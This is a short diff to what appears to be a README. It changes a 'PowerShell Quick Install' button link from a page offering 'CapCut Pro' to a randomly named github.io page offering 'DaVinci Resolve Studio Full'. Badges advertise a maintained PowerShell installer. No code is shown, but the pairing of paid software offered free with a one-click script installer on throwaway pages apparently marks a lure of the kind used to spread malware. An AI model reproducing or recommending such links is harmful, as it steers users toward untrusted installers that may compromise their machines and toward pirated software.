@@ -5,7 +5,7 @@
 
 ### 🚀 PowerShell Quick Install
 
-[![](files/button.png)](https://frostpillage.github.io/CapCut-Pro-Version/)
+[![](files/button.png)](https://navypigeondepression.github.io/Davinci-Resolve-Studio-Full/)
 
 [![platform](https://img.shields.io/badge/platform-win_11-a855f7?style=plastic&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/channel-maintained-2ea44f?style=plastic&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/powershell--7-installer-9333ea?style=plastic&labelColor=0d1117)]()
 
